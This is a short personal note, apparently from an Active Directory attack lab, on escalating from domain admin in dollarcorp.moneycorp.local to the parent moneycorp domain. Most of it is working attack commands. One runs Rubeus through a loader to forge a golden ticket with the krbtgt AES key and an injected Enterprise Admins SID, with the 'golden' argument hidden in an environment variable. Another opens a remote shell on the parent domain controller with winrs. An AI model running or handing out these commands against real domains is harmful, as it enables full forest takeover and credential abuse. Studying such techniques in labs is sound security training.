[[priv-esc]]
1) *using DA access to dollarcorp.moneycorp.local*
obtain krbtgt hash 
```
echo %Pwn%
```
%Pwn% = golden
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```
now access using winrs
```
winrs -r:mcorp-dc.moneycorp.local cmd
```
